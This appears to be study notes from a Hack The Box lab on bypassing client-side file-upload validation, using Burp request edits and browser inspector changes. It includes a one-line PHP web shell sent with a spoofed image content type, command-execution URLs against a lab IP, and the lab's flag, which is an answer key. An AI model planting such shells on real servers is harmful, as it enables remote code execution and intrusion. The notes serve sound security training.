# Client-Side Validation

When the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. 

Example :
We may still select the All Files option to select our PHP script anyway, but when we do so, we get an error message saying (Only images are allowed!) and Upload gets disabled

## Back-end Request Modification

Using Burp :

filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>

## Disabling Front-end Validation

Using Burp :
[CTRL+SHIFT+C] to toggle the browser's Page Inspector

<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

[CTRL+SHIFT+K], and then we can type the function's name (checkFile) :

function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}

Modify it to :
onchange=""

Check the URL of uploading :
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">

http://SERVER_IP:PORT/profile_images/shell.php?cmd=id

## LAB

     <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
        <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
        <img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>
        <input type="submit" value="Upload" id="submit">
      </form>

function validate() {
  var file = $("#uploadFile")[0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
    return false;
  } else {
    return true;
  }
}

Burp > Proxy > Options > Intercept Server Responses

Change

onSubmit="if(validate()){upload()}"

to

onSubmit="upload()"

http://94.237.56.188:35745/profile_images/shell.php?cmd=id

http://94.237.56.188:35745/profile_images/shell.php?cmd=cat%20/flag.txt
HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}